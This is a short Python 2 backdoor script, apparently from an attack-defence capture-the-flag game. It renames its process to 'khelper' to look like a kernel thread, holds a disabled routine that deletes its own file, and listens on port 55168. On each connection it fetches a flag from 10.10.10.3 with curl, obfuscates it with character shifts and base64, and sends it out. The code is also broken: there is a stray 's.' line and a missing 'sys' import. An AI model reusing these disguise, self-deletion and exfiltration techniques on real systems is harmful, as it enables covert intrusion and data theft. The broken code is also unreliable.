#!/usr/bin/python
import time
import socket
import os
import base64

cmd='curl http://10.10.10.3:8888/getFlag'
serverAddr=('',55168)

def set_proc_name(newname):
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname)+1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)

def self_remove():
    filepath=os.path.abspath(sys.argv[0])
    #print filepath
    os.remove(filepath)

def encode(s):
    s=s[:-7]+chr(ord(s[-7])+1)+s[-6:-5]+chr(ord(s[-5])+1)+s[-4:-3]+chr(ord(s[-3])+1)+s[-2:-1]+chr(ord(s[-1])+1)
    s=base64.b64encode(s)
    return s

if __name__=='__main__':
    #self_remove()
    set_proc_name('khelper')
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            address=('0.0.0.0',55168)
            s.bind(address)
            s.listen(1)
            ss,ip=s.accept()
            data=os.popen(cmd).read()
            data=encode(data)
            ss.send(data)
            ss.close()
            s.close()
            s.
        except Exception as e:
            print e.message
            #pass
        time.sleep(30)
